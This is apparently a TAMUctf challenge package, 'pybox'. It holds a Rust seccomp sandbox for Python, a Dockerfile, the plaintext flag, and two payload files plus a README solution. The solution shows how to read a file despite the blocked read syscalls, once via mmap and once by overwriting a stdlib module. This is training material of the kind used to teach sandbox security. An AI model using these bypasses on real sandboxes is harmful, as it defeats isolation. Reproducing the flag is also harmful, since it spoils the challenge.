{
    "challenge.py": "from hacksport.operations import execute\nfrom hacksport.problem import Challenge, File\n\n\nclass Problem(Challenge):\n    def setup(self):\n        pass\n\n    def generate_flag(self, random):\n        return r\"gigem{m3m0ry_m4pp3d_f1l35}\"\n",
    "Dockerfile": "FROM rust\n\nRUN apt-get update -y\nRUN apt-get install -y seccomp libseccomp-dev libpython3.7-dev socat\n\nCOPY restricted_python /pwn/restricted_python\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nRUN cd restricted_python && cargo build --release\nEXPOSE 7234\n\nENTRYPOINT [\"sh\", \"-c\", \"exec socat TCP-LISTEN:7234,reuseaddr,fork EXEC:/pwn/restricted_python/target/release/restricted_python,stderr\"]\n",
    "flag.txt": "gigem{m3m0ry_m4pp3d_f1l35}",
    "payload.txt": "2\nmmap\nos\n\nf = os.open(\"flag.txt\", os.O_RDONLY)\nprint(mmap.mmap(f, 0, prot=mmap.PROT_READ)[:].decode('ascii'))\n\n\n.\n",
    "payload2.txt": "3\nimportlib\nimportlib.util\nthis\nloader = importlib.util.find_spec(\"this\").loader\nloader.set_data(\"/usr/lib/python3.7/this.py\", b\"\"\"print(open(\"flag.txt\").read())\"\"\")\nloader.load_module()\n\n.\n",
    "problem.json": "{\n  \"name\": \"pybox\",\n  \"category\": \"Sandbox\",\n  \"description\": \"We spun up a server for you to execute your python code! For security reasons, we've disabled a few syscalls, but you can do all the computation you'd like!\\n{{url_for('restricted_python/src/main.rs')}}\\n<code>openssl s_client -connect tamuctf.com:443 -servername pybox -quiet</code>\",\n  \"score\" : 150,\n  \"hints\": [],\n  \"walkthrough\": \"N/A\",\n  \"author\": \"Teddy Heinen\",\n  \"organization\": \"TAMUctf\",\n  \"event\": \"TAMUctf\"\n}\n\n",
    "README.md": "# pybox\n\n## Description\n\n`nc -q1 challenges.tamuctf.com 7234`\n\nWe spun up a remote server to execute your python code!  For security reasons we disabled a few syscalls but you can do all the computation you'd like!\n\nNote: The python process can't import libraries so you'll need to instruct the server ahead of time which libraries are required.  \n\n(source is provided but not the binary)\n\n## Solution\n\nFrom the source, we can identify the list of blocked syscalls:\n\n```rust\nconst BLOCKED_SYSCALLS: [i32; 3] = [0, 17, 19];\n```\n\nReviewing [this list for syscall mappings](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit), we find that the blocked syscalls are read, pread64, and readv. So we're not reading things today.\n\nNotice also, however, that open is not a blocked syscall. Neither is mmap; using these together, we can read a section by mapping it to an address space and then just reading the memory.\n\n```\n2\nmmap\nos\nf = os.open(\"flag.txt\", os.O_RDONLY)\nprint(mmap.mmap(f, 0, prot=mmap.PROT_READ)[:].decode('ascii'))\n```\n\nos.open gives us a file descriptor, mmap maps the file to a region in memory. Fun!\n",
    "restricted_python\\Cargo.lock": "# This file is automatically @generated by Cargo.\n# It is not intended for manual editing.\n[[package]]\nname = \"bitflags\"\nversion = \"1.2.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"cf1de2fe8c75bc145a2f577add951f8134889b4795d47466a54a5c846d691693\"\n\n[[package]]\nname = \"cfg-if\"\nversion = \"0.1.10\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"4785bdd1c96b2a846b2bd7cc02e86b6b3dbf14e7e53446c4f54c92a361040822\"\n\n[[package]]\nname = \"cloudabi\"\nversion = \"0.1.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"4344512281c643ae7638bbabc3af17a11307803ec8f0fcad9fae512a8bf36467\"\ndependencies = [\n \"bitflags\",\n]\n\n[[package]]\nname = \"ctor\"\nversion = \"0.1.15\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"39858aa5bac06462d4dd4b9164848eb81ffc4aa5c479746393598fd193afa227\"\ndependencies = [\n \"quote\",\n \"syn\",\n]\n\n[[package]]\nname = \"ghost\"\nversion = \"0.1.2\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"1a5bcf1bbeab73aa4cf2fde60a846858dc036163c7c33bec309f8d17de785479\"\ndependencies = [\n \"proc-macro2\",\n \"quote\",\n \"syn\",\n]\n\n[[package]]\nname = \"indoc\"\nversion = \"0.3.6\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"47741a8bc60fb26eb8d6e0238bbb26d8575ff623fdc97b1a2c00c050b9684ed8\"\ndependencies = [\n \"indoc-impl\",\n \"proc-macro-hack\",\n]\n\n[[package]]\nname = \"indoc-impl\"\nversion = \"0.3.6\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"ce046d161f000fffde5f432a0d034d0341dc152643b2598ed5bfce44c4f3a8f0\"\ndependencies = [\n \"proc-macro-hack\",\n \"proc-macro2\",\n \"quote\",\n \"syn\",\n \"unindent\",\n]\n\n[[package]]\nname = \"instant\"\nversion = \"0.1.6\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"5b141fdc7836c525d4d594027d318c84161ca17aaf8113ab1f81ab93ae897485\"\n\n[[package]]\nname = \"inventory\"\nversion = \"0.1.8\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"49c68da9c8b1bda33dc6f55b2a9b4f44eca5ba2b2a1a308eab40db9fb7e200cb\"\ndependencies = [\n \"ctor\",\n \"ghost\",\n \"inventory-impl\",\n]\n\n[[package]]\nname = \"inventory-impl\"\nversion = \"0.1.8\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"4143007b389ae51577282e3c95cf5a7ae0c9e06cafa927508300ceedcbc0354c\"\ndependencies = [\n \"proc-macro2\",\n \"quote\",\n \"syn\",\n]\n\n[[package]]\nname = \"libc\"\nversion = \"0.2.76\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"755456fae044e6fa1ebbbd1b3e902ae19e73097ed4ed87bb79934a867c007bc3\"\n\n[[package]]\nname = \"lock_api\"\nversion = \"0.4.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"28247cc5a5be2f05fbcd76dd0cf2c7d3b5400cb978a28042abcd4fa0b3f8261c\"\ndependencies = [\n \"scopeguard\",\n]\n\n[[package]]\nname = \"parking_lot\"\nversion = \"0.11.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"a4893845fa2ca272e647da5d0e46660a314ead9c2fdd9a883aabc32e481a8733\"\ndependencies = [\n \"instant\",\n \"lock_api\",\n \"parking_lot_core\",\n]\n\n[[package]]\nname = \"parking_lot_core\"\nversion = \"0.8.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"c361aa727dd08437f2f1447be8b59a33b0edd15e0fcee698f935613d9efbca9b\"\ndependencies = [\n \"cfg-if\",\n \"cloudabi\",\n \"instant\",\n \"libc\",\n \"redox_syscall\",\n \"smallvec\",\n \"winapi\",\n]\n\n[[package]]\nname = \"paste\"\nversion = \"0.1.18\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"45ca20c77d80be666aef2b45486da86238fabe33e38306bd3118fe4af33fa880\"\ndependencies = [\n \"paste-impl\",\n \"proc-macro-hack\",\n]\n\n[[package]]\nname = \"paste-impl\"\nversion = \"0.1.18\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"d95a7db200b97ef370c8e6de0088252f7e0dfff7d047a28528e47456c0fc98b6\"\ndependencies = [\n \"proc-macro-hack\",\n]\n\n[[package]]\nname = \"proc-macro-hack\"\nversion = \"0.5.18\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"99c605b9a0adc77b7211c6b1f722dcb613d68d66859a44f3d485a6da332b0598\"\n\n[[package]]\nname = \"proc-macro2\"\nversion = \"1.0.19\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"04f5f085b5d71e2188cb8271e5da0161ad52c3f227a661a3c135fdf28e258b12\"\ndependencies = [\n \"unicode-xid\",\n]\n\n[[package]]\nname = \"pyo3\"\nversion = \"0.11.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"9ca8710ffa8211c9a62a8a3863c4267c710dc42a82a7fd29c97de465d7ea6b7d\"\ndependencies = [\n \"ctor\",\n \"indoc\",\n \"inventory\",\n \"libc\",\n \"parking_lot\",\n \"paste\",\n \"pyo3cls\",\n \"unindent\",\n]\n\n[[package]]\nname = \"pyo3-derive-backend\"\nversion = \"0.11.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"58ad070bf6967b0d29ea74931ffcf9c6bbe8402a726e9afbeafadc0a287cc2b3\"\ndependencies = [\n \"proc-macro2\",\n \"quote\",\n \"syn\",\n]\n\n[[package]]\nname = \"pyo3cls\"\nversion = \"0.11.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"c3fa17e1ea569d0bf3b7c00f2a9eea831ca05e55dd76f1794c541abba1c64baa\"\ndependencies = [\n \"pyo3-derive-backend\",\n \"quote\",\n \"syn\",\n]\n\n[[package]]\nname = \"quote\"\nversion = \"1.0.7\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"aa563d17ecb180e500da1cfd2b028310ac758de548efdd203e18f283af693f37\"\ndependencies = [\n \"proc-macro2\",\n]\n\n[[package]]\nname = \"redox_syscall\"\nversion = \"0.1.57\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"41cc0f7e4d5d4544e8861606a285bb08d3e70712ccc7d2b84d7c0ccfaf4b05ce\"\n\n[[package]]\nname = \"restricted_python\"\nversion = \"0.1.0\"\ndependencies = [\n \"libc\",\n \"pyo3\",\n \"seccomp\",\n \"seccomp-sys\",\n]\n\n[[package]]\nname = \"scopeguard\"\nversion = \"1.1.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"d29ab0c6d3fc0ee92fe66e2d99f700eab17a8d57d1c1d3b748380fb20baa78cd\"\n\n[[package]]\nname = \"seccomp\"\nversion = \"0.1.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"075f89fb373fa870fab7691c9a45054504e0295e1db5051cc7bb53f57fe26b9c\"\ndependencies = [\n \"libc\",\n \"seccomp-sys\",\n]\n\n[[package]]\nname = \"seccomp-sys\"\nversion = \"0.1.3\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"e5bcf74ba0708aeaf8d702e4f84f7458ae1de42d80e2c20963a395b6038e6be6\"\ndependencies = [\n \"libc\",\n]\n\n[[package]]\nname = \"smallvec\"\nversion = \"1.4.2\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"fbee7696b84bbf3d89a1c2eccff0850e3047ed46bfcd2e92c29a2d074d57e252\"\n\n[[package]]\nname = \"syn\"\nversion = \"1.0.39\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"891d8d6567fe7c7f8835a3a98af4208f3846fba258c1bc3c31d6e506239f11f9\"\ndependencies = [\n \"proc-macro2\",\n \"quote\",\n \"unicode-xid\",\n]\n\n[[package]]\nname = \"unicode-xid\"\nversion = \"0.2.1\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"f7fe0bb3479651439c9112f72b6c505038574c9fbb575ed1bf3b797fa39dd564\"\n\n[[package]]\nname = \"unindent\"\nversion = \"0.1.6\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"af41d708427f8fd0e915dcebb2cae0f0e6acb2a939b2d399c265c39a38a18942\"\n\n[[package]]\nname = \"winapi\"\nversion = \"0.3.9\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"5c839a674fcd7a98952e593242ea400abe93992746761e38641405d28b00f419\"\ndependencies = [\n \"winapi-i686-pc-windows-gnu\",\n \"winapi-x86_64-pc-windows-gnu\",\n]\n\n[[package]]\nname = \"winapi-i686-pc-windows-gnu\"\nversion = \"0.4.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"ac3b87c63620426dd9b991e5ce0329eff545bccbbb34f3be09ff6fb6ab51b7b6\"\n\n[[package]]\nname = \"winapi-x86_64-pc-windows-gnu\"\nversion = \"0.4.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"712e227841d057c1ee1cd2fb22fa7e5a5461ae8e48fa2ca79ec42cfc1931183f\"\n",
    "restricted_python\\Cargo.toml": "[package]\nname = \"restricted_python\"\nversion = \"0.1.0\"\nauthors = [\"Teddy Heinen <teddy@heinen.dev>\"]\nedition = \"2018\"\n\n# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html\n\n[dependencies]\npyo3 = \"0.11.1\"\nseccomp = \"0.1.1\"\nlibc = \"0.2.76\"\nseccomp-sys = \"0.1.3\"",
    "restricted_python\\src\\main.rs": "use pyo3::prelude::*;\nuse pyo3::types::PyDict;\nuse seccomp_sys::{\n    seccomp_init, seccomp_load, seccomp_rule_add_array, SCMP_ACT_ALLOW, SCMP_ACT_KILL,\n};\nuse std::io::prelude::*;\n\nconst BLOCKED_SYSCALLS: [i32; 3] = [0, 17, 19];\n\nfn sandbox() -> Result<(), ()> {\n    unsafe {\n        let ctx = seccomp_init(SCMP_ACT_ALLOW);\n        if ctx.is_null() {\n            return Err(());\n        }\n        let mut status = BLOCKED_SYSCALLS\n            .iter()\n            .map(|syscall| seccomp_rule_add_array(ctx, SCMP_ACT_KILL, *syscall, 0, [].as_ptr()))\n            .fold(0i32, |sum, val| sum | val);\n        status |= seccomp_load(ctx);\n        if status != 0 {\n            return Err(());\n        }\n        Ok(())\n    }\n}\n\nfn run(stream: &mut (impl Read + BufRead)) -> Result<(), ()> {\n    println!(\"How many modules do you need to load?\");\n    let library_length = {\n        let mut lib_len_str = String::with_capacity(2);\n        stream.read_line(&mut lib_len_str).unwrap();\n        lib_len_str.trim().parse::<i32>().unwrap()\n    };\n    let gil = Python::acquire_gil();\n    let py = gil.python();\n    println!(\"Please enter required modules, one to a line\");\n    let modules: Vec<(String, &PyModule)> = (0..library_length)\n        .map(|_| {\n            let mut temp_lib_str = String::new();\n            stream.read_line(&mut temp_lib_str).unwrap();\n            temp_lib_str.trim().to_string()\n        })\n        .filter_map(|x| {\n            let module = py.import(&x);\n            if module.is_err() {\n                println!(\"Failed to import module: {}\", x);\n                None\n            } else {\n                Some((x.clone(), module.unwrap()))\n            }\n        })\n        .collect();\n    println!(\"Please enter code, terminated by an empty line with a period (.)\");\n    let code = {\n        let mut temp_str = String::new();\n        for line in stream.lines() {\n            let line = line.unwrap();\n            if line.trim() == \".\" {\n                break\n            }\n            temp_str += &line;\n            temp_str += &\"\\n\";\n        }\n        temp_str\n    };\n    let mut globals = PyDict::new(py);\n    let builtins = py.import(\"builtins\");\n    if builtins.is_err() {\n        println!(\"Couldn't import builtins, probably go tell an admin\");\n    }\n    globals.set_item(\"__builtins__\", builtins.unwrap()).unwrap();\n    modules.iter().for_each(|(name, x)| globals.set_item(name, x).unwrap());\n    if let Err(_) = sandbox() {\n        println!(\"Failed to setup sandbox\");\n        return Err(());\n    }\n    if let Err(e) = py.run(&code, Some(globals), None) {\n        e.print(py);\n    };\n\n    Ok(())\n}\n\nfn main() -> Result<(), ()> {\n    let stdin = std::io::stdin();\n\n    run(&mut stdin.lock()).unwrap();\n    Ok(())\n}\n",
    "category": "misc"
}